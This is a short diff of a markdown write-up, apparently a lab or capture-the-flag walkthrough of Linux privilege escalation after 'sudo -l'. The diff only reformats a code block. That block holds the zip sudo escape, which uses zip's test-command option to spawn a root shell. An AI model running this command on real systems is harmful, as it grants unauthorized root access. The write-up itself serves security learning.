@@ -182,11 +182,11 @@ sudo -l
   <img width="981" height="454" alt="image" src="https://github.com/user-attachments/assets/e997ee26-2f39-44b8-98f9-b34093bfc117" />
   <img width="1168" height="741" alt="image" src="https://github.com/user-attachments/assets/eb59fae9-5b66-432b-9004-dc759cb603d7" />
 
-  ```bash
- TF=$(mktemp -u)
- sudo zip $TF /etc/hosts -T -TT 'sh #'
- sudo rm $TF
-```
+```bash
+ TF=$(mktemp -u)  
+ sudo zip $TF /etc/hosts -T -TT 'sh #'  
+ sudo rm $TF  
+```      
 
 <img width="1190" height="424" alt="image" src="https://github.com/user-attachments/assets/f2b297e2-3b94-489d-9208-7f7e940800a4" />
 
